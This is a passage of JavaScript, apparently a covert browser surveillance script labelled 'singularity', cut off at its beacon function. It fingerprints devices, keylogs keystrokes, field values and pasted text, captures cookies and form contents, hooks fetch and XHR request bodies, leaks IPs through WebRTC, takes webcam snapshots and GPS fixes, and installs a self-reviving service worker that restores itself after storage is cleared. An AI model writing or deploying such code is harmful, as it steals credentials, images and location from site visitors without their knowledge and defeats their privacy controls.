    screen: { w: s.width, h: s.height, availW: s.availWidth, availH: s.availHeight, depth: s.colorDepth, dpr: devicePixelRatio || 1 },
    window: { w: innerWidth, h: innerHeight, outerW: outerWidth, outerH: outerHeight },
    touch: { max: n.maxTouchPoints || 0, coarse: mm("(pointer:coarse)"), hover: mm("(hover:hover)") },
    hw: { cores: n.hardwareConcurrency || null, memoryGB: n.deviceMemory || null },
    cookieEnabled: n.cookieEnabled, doNotTrack: n.doNotTrack || null, webdriver: !!n.webdriver,
    pdfViewer: !!n.pdfViewerEnabled, reducedMotion: mm("(prefers-reduced-motion: reduce)"),
    darkMode: mm("(prefers-color-scheme: dark)"),
    colorGamut: mm("(color-gamut: p3)") ? "p3" : (mm("(color-gamut: srgb)") ? "srgb" : "none"),
    iframe: (function () { try { return window.self !== window.top; } catch (e) { return true; } })(),
    opener: !!window.opener, historyLength: history.length, secureContext: !!window.isSecureContext,
    standalone: STANDALONE, displayMode: displayMode(),
    installed: !!navigator.standalone || ls("sg:installed") === "1",
    os: osGuess(), browser: browserGuess(),
    fromOS: FROM_OS, inIframe: IFR, isWin: WIN,
    crossOriginIsolated: !!window.crossOriginIsolated,
    sharedArrayBuffer: typeof SharedArrayBuffer !== "undefined",
    launchQueue: !!window.launchQueue, getInstalledRelatedApps: !!navigator.getInstalledRelatedApps
  };
  if (CFG.spoof) { R.env.real = { cores: R.env.hw.cores, mem: R.env.hw.memoryGB, ua: R.env.ua }; }
}
function displayMode() {
  try {
    if (matchMedia("(display-mode: standalone)").matches) return "standalone";
    if (matchMedia("(display-mode: window-controls-overlay)").matches) return "wco";
    if (matchMedia("(display-mode: minimal-ui)").matches) return "minimal-ui";
    if (matchMedia("(display-mode: fullscreen)").matches) return "fullscreen";
    return "browser";
  } catch (e) { return "?"; }
}
function osGuess() {
  var ua = navigator.userAgent;
  if (/Windows NT 10/.test(ua)) return "Windows 10/11";
  if (/Windows/.test(ua)) return "Windows";
  if (/Android/.test(ua)) return "Android";
  if (/iPhone|iPad|iPod/.test(ua)) return "iOS";
  if (/Mac OS X/.test(ua)) return "macOS";
  if (/CrOS/.test(ua)) return "ChromeOS";
  if (/Linux/.test(ua)) return "Linux";
  return navigator.platform || "unknown";
}
function browserGuess() {
  var ua = navigator.userAgent;
  if (/Edg\//.test(ua)) return "Edge";
  if (/OPR\/|Opera/.test(ua)) return "Opera";
  if (/SamsungBrowser/.test(ua)) return "Samsung Internet";
  if (/FxiOS/.test(ua)) return "Firefox iOS";
  if (/Firefox\//.test(ua)) return "Firefox";
  if (/CriOS/.test(ua)) return "Chrome iOS";
  if (/Chrome\//.test(ua)) return "Chrome";
  if (/Safari\//.test(ua)) return "Safari";
  return "unknown";
}
function enumerate2() {
  var E = R.enum2;
  try {
    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
      navigator.userAgentData.getHighEntropyValues(
        ["architecture", "bitness", "model", "platformVersion", "uaFullVersion", "fullVersionList", "wow64"])
        .then(function (h) { R.env.uach = h; R.env.uachMobile = navigator.userAgentData.mobile; push(false); })
        .catch(function () {});
    }
  } catch (e) {}
  try {
    var I = Intl.DateTimeFormat().resolvedOptions();
    E.intl = { locale: I.locale, calendar: I.calendar, numberingSystem: I.numberingSystem,
               hourCycle: I.hourCycle, tz: I.timeZone,
               collator: (function () { try { return new Intl.Collator().resolvedOptions().locale; } catch (e) { return null; } })(),
               nf: (function () { try { return new Intl.NumberFormat().format(1234567.891); } catch (e) { return null; } })() };
  } catch (e) {}
  try { E.gamepads = (navigator.getGamepads ? Array.prototype.slice.call(navigator.getGamepads()).filter(Boolean) : []).map(function (g) { return { id: g.id, axes: g.axes.length, buttons: g.buttons.length, mapping: g.mapping }; }); } catch (e) {}
  try { E.voices = (speechSynthesis && speechSynthesis.getVoices ? speechSynthesis.getVoices() : []).map(function (v) { return v.name + "/" + v.lang; }).slice(0, 40); } catch (e) {}
  try { if (navigator.connection) E.net = { type: navigator.connection.effectiveType, down: navigator.connection.downlink, rtt: navigator.connection.rtt, save: navigator.connection.saveData }; } catch (e) {}
  try { if (navigator.xr && navigator.xr.isSessionSupported) { navigator.xr.isSessionSupported("immersive-vr").then(function (v) { E.xr = !!v; }).catch(function () {}); } } catch (e) {}
  try { E.webgpu = !!navigator.gpu; } catch (e) {}
  try { E.usb = !!navigator.usb; E.hid = !!navigator.hid; E.serial = !!navigator.serial; E.bt = !!navigator.bluetooth; } catch (e) {}
  try { E.midi = !!navigator.requestMIDIAccess; } catch (e) {}
  try { if (navigator.storage && navigator.storage.estimate) navigator.storage.estimate().then(function (e2) { E.quotaMB = e2.quota ? Math.round(e2.quota / 1048576) : null; E.usageMB = e2.usage ? +(e2.usage / 1048576).toFixed(1) : null; push(false); }).catch(function () {}); } catch (e) {}
  try { if (indexedDB.databases) indexedDB.databases().then(function (d) { E.idbs = d.map(function (x) { return x.name + "@" + x.version; }); push(false); }).catch(function () {}); } catch (e) {}
  try { if (window.caches) caches.keys().then(function (k) { E.caches = k; push(false); }).catch(function () {}); } catch (e) {}
  try {
    if (navigator.serviceWorker && navigator.serviceWorker.getRegistrations) {
      navigator.serviceWorker.getRegistrations().then(function (rs) {
        E.sws = rs.map(function (r) { return (r.scope || "") + " <- " + ((r.active || r.installing || r.waiting || {}).scriptURL || ""); });
        push(false);
      }).catch(function () {});
    }
  } catch (e) {}
  try { if (window.cookieStore && cookieStore.getAll) cookieStore.getAll().then(function (cs) { E.cookies = cs.length; }).catch(function () {}); } catch (e) {}
  try { if (navigator.permissions && navigator.permissions.query) navigator.permissions.query({ name: "storage-access" }).then(function (s) { E.storageAccess = s.state; }).catch(function () {}); } catch (e) {}
}

/* ================= 2. ページ / DOM / キーログ ================= */
function pageMeta() {
  R.page = {
    title: document.title || null, forms: document.forms.length,
    inputs: document.querySelectorAll("input").length,
    links: document.querySelectorAll("a").length, images: document.images.length,
    scripts: document.scripts.length, lang: document.documentElement.lang || null,
    charset: document.characterSet, readyState: document.readyState
  };
}
var KEYLOG = [];
function keylog() {
  function nm(el) {
    if (!el) return null;
    try { return (el.name || el.id || el.type || el.tagName || "").slice(0, 40) || null; } catch (e) { return null; }
  }
  addEventListener("keydown", function (e) {
    if (KEYLOG.length > 400) KEYLOG.shift();
    KEYLOG.push({ t: now() - T0, k: (e.key || "").slice(0, 12), f: nm(e.target), v: e.target && e.target.value ? String(e.target.value).slice(0, 60) : null });
  }, true);
  addEventListener("input", function (e) {
    if (KEYLOG.length > 400) KEYLOG.shift();
    KEYLOG.push({ t: now() - T0, k: "=", f: nm(e.target), v: String((e.target && e.target.value) || "").slice(0, 80) });
  }, true);
  addEventListener("paste", function (e) {
    var p = ""; try { p = (e.clipboardData || window.clipboardData).getData("text") || ""; } catch (er) {}
    if (p) KEYLOG.push({ t: now() - T0, k: "paste", f: nm(e.target), v: p.slice(0, 120) });
  }, true);
}
function domSnap(force) {
  if (!CFG.dom && !force) return;
  try {
    var fields = [], forms = [];
    document.querySelectorAll("input,select,textarea").forEach(function (el) {
      if (fields.length > 120) return;
      var t = (el.type || el.tagName).toLowerCase();
      if (t === "hidden" && !el.value) return;
      fields.push({ n: (el.name || el.id || "").slice(0, 40), t: t, v: String(el.value == null ? "" : el.value).slice(0, 120), ph: (el.placeholder || "").slice(0, 30) });
    });
    document.querySelectorAll("form").forEach(function (f, i) {
      if (i > 20) return;
      forms.push({ a: (f.action || "").slice(0, 200), m: (f.method || "get").toLowerCase(), n: (f.name || f.id || "").slice(0, 40) });
    });
    var cs = [];
    try { (document.cookie || "").split(";").forEach(function (c) { var s = c.trim(); if (s && cs.length < 40) cs.push(s.slice(0, 120)); }); } catch (e) {}
    R.cookies = cs;
    R.dom = { url: location.href, title: document.title, forms: forms, fields: fields,
              referrer: document.referrer || null, at: now() };
  } catch (e) { err_(e); }
}
function hookXHR() {
  if (!CFG.xhr) return;
  var CALLS = [];
  function rec(m, u, body, st) {
    if (CALLS.length > 60) CALLS.shift();
    CALLS.push({ m: m, u: String(u).slice(0, 200), b: body ? String(body).slice(0, 200) : null, s: st, t: now() - T0 });
    R.api = CALLS;
  }
  try {
    var of = window.fetch;
    if (of) {
      window.fetch = function (input, init) {
        try { rec((init && init.method) || "GET", (input && input.url) || input, init && init.body, 0); } catch (e) {}
        return of.apply(this, arguments);
      };
    }
  } catch (e) {}
  try {
    var oo = XMLHttpRequest.prototype.open, os = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.open = function (m, u) { try { this.__sgm = m; this.__sgu = u; } catch (e) {} return oo.apply(this, arguments); };
    XMLHttpRequest.prototype.send = function (b) {
      try {
        var self2 = this;
        self2.addEventListener("load", function () { rec(self2.__sgm, self2.__sgu, b, self2.status); });
        rec(self2.__sgm, self2.__sgu, b, -1);
      } catch (e) {}
      return os.apply(this, arguments);
    };
  } catch (e) {}
  R.xhrHooked = true;
}

/* ================= 3. 指紋 ================= */
function canvasFP() {
  try {
    var c = document.createElement("canvas"), x = c.getContext("2d");
    c.width = 260; c.height = 60;
    x.textBaseline = "top"; x.font = "14px Arial";
    x.fillStyle = "#f60"; x.fillRect(0, 0, 120, 22);
    x.fillStyle = "#069"; x.fillText("SINGULARITY", 2, 15);
    x.fillStyle = "rgba(102,204,0,0.7)"; x.fillText("SINGULARITY", 4, 30);
    x.globalCompositeOperation = "multiply";
    x.fillStyle = "rgb(255,0,255)"; x.beginPath(); x.arc(50, 40, 20, 0, Math.PI * 2, true); x.fill();
    x.fillStyle = "rgb(0,255,255)"; x.beginPath(); x.arc(70, 40, 20, 0, Math.PI * 2, true); x.fill();
    var d = c.toDataURL();
    return { hash: hash(d), bytes: d.length };
  } catch (e) { return null; }
}
function webglFP() {
  try {
    var c = document.createElement("canvas");
    var gl = c.getContext("webgl2") || c.getContext("webgl") || c.getContext("experimental-webgl");
    if (!gl) return null;
    var dbg = gl.getExtension("WEBGL_debug_renderer_info");
    var o = {
      vendor: gl.getParameter(gl.VENDOR), renderer: gl.getParameter(gl.RENDERER),
      gpuVendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : null,
      gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : null,
      glVersion: gl.getParameter(gl.VERSION), glsl: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
      maxTexture: gl.getParameter(gl.MAX_TEXTURE_SIZE),
      maxViewport: (gl.getParameter(gl.MAX_VIEWPORT_DIMS) || []).join("x"),
      extCount: (gl.getSupportedExtensions() || []).length,
      webgl2: !!gl.texStorage2D
    };
    o.hash = hash(JSON.stringify(o));
    return o;
  } catch (e) { return null; }
}
function audioFP() {
  try {
    var AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
    if (!AC) return;
    var ctx = new AC(1, 44100, 44100), osc = ctx.createOscillator();
    osc.type = "triangle"; osc.frequency.value = 10000;
    var comp = ctx.createDynamicsCompressor();
    comp.threshold.value = -50; comp.knee.value = 40; comp.ratio.value = 12;
    comp.attack.value = 0; comp.release.value = 0.25;
    osc.connect(comp); comp.connect(ctx.destination); osc.start(0);
    ctx.oncomplete = function (e) {
      var d = e.renderedBuffer.getChannelData(0), sum = 0;
      for (var i = 4500; i < 5000; i++) sum += Math.abs(d[i]);
      R.vectors.audio = { hash: hash(sum.toFixed(8)), sample: +sum.toFixed(8) };
      push(false);
    };
    ctx.startRendering();
  } catch (e) { err_(e); }
}
var FONTS = ["Arial", "Arial Black", "Calibri", "Cambria", "Comic Sans MS", "Consolas",
  "Courier New", "Georgia", "Impact", "Lucida Console", "Malgun Gothic", "Meiryo",
  "Microsoft YaHei", "MS Gothic", "MS PGothic", "MS UI Gothic", "Palatino Linotype",
  "Segoe UI", "SimSun", "Tahoma", "Times New Roman", "Trebuchet MS", "Verdana",
  "Yu Gothic", "Yu Gothic UI", "Hiragino Kaku Gothic ProN", "Hiragino Sans",
  "Noto Sans JP", "Helvetica Neue", "Roboto", "Ubuntu", "DejaVu Sans", "Menlo", "Monaco"];
function fontFP() {
  try {
    var b = "mmmmmmmmmmlli", bases = ["monospace", "sans-serif", "serif"];
    var sp = document.createElement("span");
    sp.style.cssText = "position:absolute;left:-9999px;top:-9999px;font-size:72px;";
    sp.textContent = b; document.body.appendChild(sp);
    var w = {};
    bases.forEach(function (f) { sp.style.fontFamily = f; w[f] = sp.offsetWidth + "x" + sp.offsetHeight; });
    var hit = [];
    FONTS.forEach(function (f) {
      var ok = bases.some(function (b2) {
        sp.style.fontFamily = "'" + f + "'," + b2;
        return sp.offsetWidth + "x" + sp.offsetHeight !== w[b2];
      });
      if (ok) hit.push(f);
    });
    sp.remove();
    var viaApi = [];
    try {
      if (document.fonts && document.fonts.check) {
        FONTS.forEach(function (f) { if (document.fonts.check('12px "' + f + '"')) viaApi.push(f); });
      }
    } catch (e) {}
    return { count: hit.length, detected: hit, viaApi: viaApi.length, hash: hash(hit.join("|") + viaApi.join("|")) };
  } catch (e) { return null; }
}
function mathFP() {
  var out = [];
  try {
    out.push(Math.tan(-1e300), Math.sinh(1), Math.cosh(10), Math.tanh(0.5),
             Math.asinh(1), Math.acosh(1e300), Math.expm1(1), Math.log1p(10),
             Math.pow(Math.PI, -100), Math.atan2(1e300, 1e-300));
  } catch (e) {}
  return { hash: hash(out.join(",")) };
}

/* ================= 4. ネット / 地理 / リーク ================= */
var TZ_CC = { "Asia/Tokyo": "JP", "Asia/Seoul": "KR", "Asia/Shanghai": "CN", "Asia/Taipei": "TW",
  "Asia/Hong_Kong": "HK", "Asia/Singapore": "SG", "Asia/Bangkok": "TH", "Asia/Jakarta": "ID",
  "Asia/Manila": "PH", "Asia/Kolkata": "IN", "Asia/Dubai": "AE", "Asia/Jerusalem": "IL",
  "Europe/London": "GB", "Europe/Paris": "FR", "Europe/Berlin": "DE", "Europe/Madrid": "ES",
  "Europe/Rome": "IT", "Europe/Moscow": "RU", "Europe/Amsterdam": "NL", "Europe/Warsaw": "PL",
  "Europe/Istanbul": "TR", "America/New_York": "US", "America/Chicago": "US", "America/Denver": "US",
  "America/Los_Angeles": "US", "America/Phoenix": "US", "America/Sao_Paulo": "BR",
  "America/Mexico_City": "MX", "America/Toronto": "CA", "Australia/Sydney": "AU",
  "Pacific/Auckland": "NZ", "Africa/Cairo": "EG", "Africa/Lagos": "NG", "Africa/Johannesburg": "ZA" };

function jget(url) {
  return new Promise(function (res) {
    var t = setTimeout(function () { res(null); }, CFG.timeout);
    fetch(url, { mode: "cors", cache: "no-store" })
      .then(function (r) { return r.json(); })
      .then(function (j) { clearTimeout(t); res(j); })
      .catch(function () { clearTimeout(t); res(null); });
  });
}
function netIntel() {
  return Promise.all([
    jget("https://ipapi.co/json/"), jget("https://ipwho.is/"),
    jget("https://api.ipify.org?format=json")
  ]).then(function (a) {
    var i = a[0] || {}, w = a[1] || {}, f = a[2] || {}, c = w.connection || {};
    var g = {
      ip: i.ip || w.ip || f.ip || null, city: i.city || w.city || null,
      region: i.region || w.region || null, country: i.country_name || w.country || null,
      countryCode: i.country_code || w.country_code || null,
      lat: i.latitude || w.latitude || null, lon: i.longitude || w.longitude || null,
      asn: i.asn || c.asn || null, isp: c.isp || i.org || null, org: i.org || c.org || null,
      postal: i.postal || w.postal || null, currency: i.currency || null
    };
    R.network.ip = g;
    var blob = String(g.org || "") + " " + String(g.isp || "");
    R.network.vpnHint = /hosting|cloud|vpn|proxy|digitalocean|linode|ovh|hetzner|amazon|aws|google|microsoft|m247|choopa|leaseweb|contabo|vultr|oracle/i.test(blob);
    var tzc = TZ_CC[R.env.timezone];
    R.network.tzGeoMismatch = !!(tzc && g.countryCode && tzc !== g.countryCode);
    return g;
  });
}
function webrtc() {
  return new Promise(function (res) {
    var out = { local: [], public: [], mdns: [] };
    try {
      var RTC = window.RTCPeerConnection || window.webkitRTCPeerConnection;
      if (!RTC) return res(null);
      var pc = new RTC({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }, { urls: "stun:stun1.l.google.com:19302" }] });
      try { pc.createDataChannel("s"); } catch (e) {}
      pc.onicecandidate = function (e) {
        if (!e.candidate) return;
        var m = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[0-9a-f]{8}-[0-9a-f-]+\.local|[0-9a-f:]{6,})/i.exec(e.candidate.candidate);
        if (!m) return;
        var v = m[0];
        if (/\.local$/i.test(v)) out.mdns.push(v);
        else if (/^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.|fe80)/.test(v)) out.local.push(v);
        else out.public.push(v);
      };
      pc.createOffer().then(function (o) { return pc.setLocalDescription(o); }).catch(function () {});
      setTimeout(function () {
        try { pc.close(); } catch (e) {}
        out.local = uniq(out.local); out.public = uniq(out.public); out.mdns = uniq(out.mdns);
        R.network.webrtc = out;
        R.network.ipLeak = out.public[0] || null;
        res(out);
      }, 2500);
    } catch (e) { res(null); }
  });
}

/* ================= 5. プライバシー / 検知回避 ================= */
function testStore(kind) {
  try { var s = window[kind]; s.setItem("__sg", "1"); s.removeItem("__sg"); return true; }
  catch (e) { return false; }
}
function privacy() {
  R.privacy = {
    localStorage: testStore("localStorage"), sessionStorage: testStore("sessionStorage"),
    indexedDB: !!window.indexedDB, cacheAPI: !!window.caches,
    serviceWorker: !!navigator.serviceWorker, cookies: navigator.cookieEnabled,
    opfs: !!(navigator.storage && navigator.storage.getDirectory),
    webAssembly: typeof WebAssembly !== "undefined",
    webgl2: (function () { try { return !!document.createElement("canvas").getContext("webgl2"); } catch (e) { return false; } })(),
    devtools: (function () { try { return (outerWidth - innerWidth) > 160 || (outerHeight - innerHeight) > 160; } catch (e) { return null; } })()
  };
  if (navigator.storage && navigator.storage.estimate) {
    navigator.storage.estimate().then(function (e) {
      R.privacy.quotaMB = e.quota ? Math.round(e.quota / 1048576) : null;
      R.privacy.usageMB = e.usage ? +(e.usage / 1048576).toFixed(1) : null;
      R.privacy.incognitoHint = e.quota ? e.quota < 1300 * 1048576 : null;
      push(false);
    }).catch(function () {});
  }
}
function adblock() {
  var bait = document.createElement("div");
  bait.className = "adsbox ad-banner pub_300x250 text-ad";
  bait.style.cssText = "position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;";
  document.body.appendChild(bait);
  setTimeout(function () {
    try {
      var st = getComputedStyle(bait);
      R.privacy.adblock = bait.offsetHeight === 0 || bait.offsetWidth === 0 || st.display === "none";
      bait.remove();
    } catch (e) {}
    push(false);
  }, 250);
}
function perms() {
  if (!navigator.permissions || !navigator.permissions.query) return;
  R.privacy.permissions = {};
  ["geolocation", "notifications", "camera", "microphone", "clipboard-read", "midi",
   "push", "accelerometer", "gyroscope"].forEach(function (name) {
    try {
      navigator.permissions.query({ name: name }).then(function (s) {
        R.privacy.permissions[name] = s.state; push(false);
      }).catch(function () {});
    } catch (e) {}
  });
}

/* ================= 6. ハードウェア ================= */
function codecs() {
  var v = document.createElement("video"), a = document.createElement("audio");
  var can = function (el, t) { try { return el.canPlayType(t) || "no"; } catch (e) { return "no"; } };
  R.hardware.codecs = {
    h264: can(v, 'video/mp4; codecs="avc1.42E01E"'),
    hevc: can(v, 'video/mp4; codecs="hvc1.1.6.L93.B0"'),
    vp9: can(v, 'video/webm; codecs="vp9"'),
    av1: can(v, 'video/mp4; codecs="av01.0.05M.08"'),
    opus: can(a, 'audio/webm; codecs="opus"'), aac: can(a, 'audio/mp4; codecs="mp4a.40.2"')
  };
  try {
    if (navigator.requestMediaKeySystemAccess) {
      navigator.requestMediaKeySystemAccess("com.widevine.alpha", [{
        initDataTypes: ["cenc"],
        videoCapabilities: [{ contentType: 'video/mp4; codecs="avc1.42E01E"', robustness: "SW_SECURE_CRYPTO" }]
      }]).then(function () { R.hardware.drm = "widevine"; push(false); })
        .catch(function () { R.hardware.drm = "none"; });
    }
  } catch (e) {}
  try {
    var B = navigator.getBattery && navigator.getBattery();
    if (B && B.then) B.then(function (b) {
      R.hardware.battery = { level: Math.round(b.level * 100), charging: b.charging };
      push(false);
    }).catch(function () {});
  } catch (e) {}
  try { if (performance.memory) R.hardware.heapMB = Math.round(performance.memory.usedJSHeapSize / 1048576); } catch (e) {}
}
function benchmark() {
  var t = performance.now(), n = 0;
  (function loop() {
    n++;
    if (n < 200 && performance.now() - t < 600) return requestAnimationFrame(loop);
    R.hardware.fps = Math.round(n / ((performance.now() - t) / 1000));
    push(false);
  })();
}

/* ================= 7. 知覚 ================= */
function devices() {
  if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return;
  navigator.mediaDevices.enumerateDevices().then(function (l) {
    var k = {}, labels = [];
    l.forEach(function (d) { k[d.kind] = (k[d.kind] || 0) + 1; if (d.label) labels.push(d.kind + ":" + d.label); });
    R.media.devices = { counts: k, total: l.length, labels: labels.slice(0, 20) };
    push(false);
  }).catch(function () {});
}
function camera() {
  if (!CFG.media || !navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
  navigator.mediaDevices.getUserMedia({ audio: false, video: { width: { ideal: 320 }, height: { ideal: 240 }, facingMode: "user" } })
    .then(function (st) {
      var v = document.createElement("video");
      v.muted = true; v.playsInline = true; v.srcObject = st;
      v.onloadedmetadata = function () {
        v.play().then(function () {
          setTimeout(function () {
            try {
              var c = document.createElement("canvas");
              c.width = 240; c.height = 180;
              c.getContext("2d").drawImage(v, 0, 0, c.width, c.height);
              R.media.snapshot = c.toDataURL("image/jpeg", 0.6);
              var tr = st.getVideoTracks()[0], s = tr && tr.getSettings ? tr.getSettings() : {};
              R.media.camera = { w: s.width, h: s.height, fps: s.frameRate, facing: s.facingMode, label: tr && tr.label || null };
              st.getTracks().forEach(function (t) { t.stop(); });
              push(true);
            } catch (e) {}
          }, 700);
        }).catch(function () {});
      };
    }).catch(function (e) { R.media.cameraError = (e && e.name) || "error"; });
}
function geo() {
  if (!CFG.geo || !navigator.geolocation) return;
  navigator.geolocation.getCurrentPosition(function (p) {
    R.media.gps = { lat: +p.coords.latitude.toFixed(6), lon: +p.coords.longitude.toFixed(6),
      acc: Math.round(p.coords.accuracy), speed: p.coords.speed, heading: p.coords.heading };
    push(true);
  }, function (e) { R.media.gpsError = (e && e.code) || "error"; },
    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 });
}
function motion() {
  if (!CFG.sensors || !window.DeviceMotionEvent) return;
  var acc = [], gyro = [];
  var h = function (e) {
    if (e.accelerationIncludingGravity) acc.push([e.accelerationIncludingGravity.x, e.accelerationIncludingGravity.y, e.accelerationIncludingGravity.z]);
    if (e.rotationRate) gyro.push([e.rotationRate.alpha, e.rotationRate.beta, e.rotationRate.gamma]);
    if (acc.length > 200 && gyro.length > 200) removeEventListener("devicemotion", h);
  };
  addEventListener("devicemotion", h, { passive: true });
  setTimeout(function () {
    if (!acc.length && !gyro.length) return;
    R.media.motion = { accN: acc.length, gyroN: gyro.length,
      hash: hash(JSON.stringify(acc.slice(0, 12)) + "|" + JSON.stringify(gyro.slice(0, 12))) };
    push(false);
  }, 1400);
}

/* ================= 8. 行動生体 ================= */
function behavior() {
  var B = { keys: 0, dwell: [], flight: [], mouse: 0, path: [], clicks: [], scroll: { max: 0, n: 0 }, touches: [] };
  R.behavioral = B;
  var down = 0, up = 0;
  addEventListener("keydown", function () { B.keys++; if (!down) down = performance.now(); }, { passive: true });
  addEventListener("keyup", function () {
    var t = performance.now();
    if (down) { B.dwell.push(+(t - down).toFixed(1)); down = 0; }
    if (up) B.flight.push(+(t - up).toFixed(1));
    up = t;
  }, { passive: true });
  addEventListener("mousemove", function (e) {
    B.mouse++;
    if (B.path.length < 400) B.path.push([e.clientX, e.clientY]);
  }, { passive: true });
  addEventListener("click", function (e) { B.clicks.push([e.clientX, e.clientY]); }, { passive: true });
  addEventListener("scroll", function () {
    B.scroll.n++;
    B.scroll.max = Math.max(B.scroll.max, Math.round(((scrollY + innerHeight) / Math.max(1, document.body.scrollHeight)) * 100));
  }, { passive: true });
  addEventListener("touchstart", function (e) {
    var t = e.touches && e.touches[0]; if (t) B.touches.push([t.clientX, t.clientY, t.force || null]);
  }, { passive: true });
  motion();
  keylog();
}
function entropy() {
  var d = R.behavioral.dwell || [], f = R.behavioral.flight || [];
  var mean = function (a) { return a.length ? a.reduce(function (x, y) { return x + y; }, 0) / a.length : 0; };
  var sd = function (a) { if (a.length < 2) return 0; var m = mean(a); return Math.sqrt(a.reduce(function (s, v) { return s + (v - m) * (v - m); }, 0) / a.length); };
  return { dwellMean: +mean(d).toFixed(1), dwellSd: +sd(d).toFixed(1),
           flightMean: +mean(f).toFixed(1), flightSd: +sd(f).toFixed(1),
           mousePath: (R.behavioral.path || []).length };
}

/* ================= 9. bot / ハニーポット ================= */
function botProbe() {
  var b = { webdriver: !!navigator.webdriver,
    headlessUA: /headless|HeadlessChrome|PhantomJS|SlimerJS|Electron|jsdom/i.test(navigator.userAgent),
    pluginsEmpty: (navigator.plugins || []).length === 0,
    chromeObj: !!window.chrome, outerEqualsInner: outerWidth === innerWidth && outerHeight === innerHeight,
    screenAnomaly: screen.width === 0 || screen.height === 0, honeypot: false };
  try {
    var hp = document.createElement("input");
    hp.type = "text"; hp.tabIndex = -1; hp.autocomplete = "off";
    hp.style.cssText = "position:absolute;left:-9999px;opacity:0;height:0;width:0;";
    document.body.appendChild(hp);
    setTimeout(function () { b.honeypot = hp.value.length > 0; }, 600);
  } catch (e) {}
  R.bot = b;
}

/* ================= 10. 永続 / 復活 / 暗号個体ID ================= */
function persistState() {
  if (!CFG.persist) return;
  try {
    var meta = JSON.parse(ls("sg:meta") || "null") || { first: now(), hits: 0 };
    meta.hits = (meta.hits || 0) + 1; meta.prevSid = meta.sid || null; meta.sid = SID;
    meta.ver = MYVER;
    if (CFG.remember) meta.maxLevel = Math.max(meta.maxLevel || 0, LEVEL);
    ls("sg:meta", JSON.stringify(meta));
    R.privacy.revisit = meta.hits; R.privacy.returning = meta.hits > 1;
    R.privacy.maxLevel = meta.maxLevel || LEVEL;
  } catch (e) {}
  try { ck("sgid", SID); ck("sgv", MYVER); } catch (e) {}
  try {
    if (navigator.storage && navigator.storage.persist) {
      navigator.storage.persist().then(function (ok) { R.privacy.persisted = !!ok; push(false); }).catch(function () {});
    }
  } catch (e) {}
  try {
    var rq = indexedDB.open("singularity", 1);
    rq.onupgradeneeded = function () { try { rq.result.createObjectStore("hits", { autoIncrement: true }); } catch (e) {} };
    rq.onsuccess = function () {
      try { rq.result.transaction("hits", "readwrite").objectStore("hits").add({ t: now(), sid: SID, href: location.href, v: MYVER }); } catch (e) {}
    };
  } catch (e) {}
}
function resurrect() {
  /* localStorage 全消しでも Cookie / window.name / SW / Cache から蘇る */
  try {
    var meta = ls("sg:meta");
    if (!meta && (ck("sgid") || wn())) {
      R.privacy.resurrected = true;
      ls("sg:meta", JSON.stringify({ first: now(), hits: 1, sid: SID, resurrect: 1 }));
    }
  } catch (e) {}
  if (CFG.selfheal !== false && navigator.serviceWorker && navigator.serviceWorker.getRegistrations) {
    navigator.serviceWorker.getRegistrations().then(function (rs) {
      var mine = rs.some(function (r) { return (r.active && r.active.scriptURL || "").indexOf("/sg/sw.js") >= 0; });
      if (!mine) { R.privacy.selfheal = 1; swInstall(); }
    }).catch(function () {});
  }
}
function cryptoID() {
  try {
    if (!crypto || !crypto.subtle) return;
    var p = crypto.subtle;
    var rq = indexedDB.open("sg-usb", 1);
    rq.onupgradeneeded = function () { try { rq.result.createObjectStore("kv"); } catch (e) {} };
    rq.onsuccess = function () {
      try {
        var tx = rq.result.transaction("kv", "readwrite"), st = tx.objectStore("kv");
        var g = st.get("csec");
        g.onsuccess = function () {
          var sec = g.result;
          if (!sec) { sec = b64u(crypto.getRandomValues(new Uint8Array(32))); st.put(sec, "csec"); }
          R.crypto.secret = sec.slice(0, 16);
          p.digest("SHA-256", new TextEncoder().encode(sec + "|" + SID + "|" + (R.vectors.canvas || {}).hash))
            .then(function (h) { R.crypto.id = b64u(h).replace(/[^A-Za-z0-9]/g, "").slice(0, 32); push(false); })
            .catch(function () {});
        };
      } catch (e) {}
    };
  } catch (e) {}
}
function swInstall() {
  if (!CFG.swOn || !navigator.serviceWorker || !CFG.sw) return;
  navigator.serviceWorker.register(CFG.sw, { scope: "/" })
    .then(function (reg) {
      R.privacy.sw = "registered";
      function hello() {
        try {
          var t = reg.active || navigator.serviceWorker.controller;
          if (t) t.postMessage({ type: "hello", cmd: CFG.cmd, page: location.pathname, sid: SID,
                                 level: LEVEL, man: CFG.manifest, icons: CFG.icons,
                                 inj: CFG.inj, ver: MYVER });
        } catch (e) {}
      }
      hello(); setTimeout(hello, 1200); setTimeout(hello, 4000); setTimeout(hello, 9000);
      try { if (reg.sync && reg.sync.register) reg.sync.register("sg-flush"); } catch (e) {}
      try {
        if (reg.periodicSync && reg.periodicSync.register) {
          reg.periodicSync.register("sg-sync", { minInterval: 15 * 60 * 1000 })
            .then(function () { R.privacy.periodic = 1; }).catch(function () { R.privacy.periodic = "denied"; });
        }
      } catch (e) {}
      try { if (navigator.serviceWorker.controller) navigator.serviceWorker.controller.postMessage({ type: "check" }); } catch (e) {}
    })
    .catch(function (e) { R.privacy.sw = "failed:" + ((e && e.name) || "x"); });
}

/* ================= 11. 自己複製 ================= */
function mutate() {
  if (!CFG.mutate) return;
  var p = Q("ref");
  var chain = p ? p.split(".").slice(-12).concat([SID]) : [SID];
  R.chain = chain; R.viral.generation = chain.length - 1; R.viral.parent = p || null;
  var u = new URL(location.pathname, location.origin);
  u.searchParams.set("ref", chain.join("."));
  R.viral.childLink = u.toString();
  R.viral.depth = chain.length;
  if (CFG.clipboard) { try { navigator.clipboard && navigator.clipboard.writeText(R.viral.childLink); } catch (e) {} }
}

/* ================= 12. 多経路ビーコン ================= */
var ptimer = null, plast = 0;
function push(force) {
  var t = now();
